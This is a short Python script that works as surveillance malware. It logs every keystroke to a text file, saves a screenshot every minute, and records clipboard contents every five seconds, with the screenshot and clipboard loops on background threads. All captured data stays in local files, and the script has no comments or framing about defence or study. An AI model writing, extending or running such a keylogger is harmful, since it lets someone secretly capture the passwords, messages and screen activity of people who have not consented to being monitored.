from pynput import keyboard
from PIL import ImageGrab
import pyperclip
import threading
import time
import os

# === File paths ===
log_file = "keylog.txt"
clipboard_file = "clipboard_log.txt"
screenshot_folder = "screenshots"

# === Ensure screenshot folder exists ===
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# === 1. Keystroke Logging ===


def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")


def on_press(key):
    write_to_file(key)

# === 2. Screenshot Capture ===


def take_screenshot():
    while True:
        try:
            timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
            image = ImageGrab.grab()
            image.save(f"{screenshot_folder}/{timestamp}.png")
        except Exception as e:
            print(f"Screenshot error: {e}")
        time.sleep(60)  # every 60 seconds

# === 3. Clipboard Logging ===


def log_clipboard():
    previous_data = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != previous_data:
                with open(clipboard_file, "a") as f:
                    f.write(
                        f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]: {data}\n")
                previous_data = data
        except Exception as e:
            print(f"Clipboard error: {e}")
        time.sleep(5)


# === Start background threads ===
threading.Thread(target=take_screenshot, daemon=True).start()
threading.Thread(target=log_clipboard, daemon=True).start()

# === Start keylogger ===
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
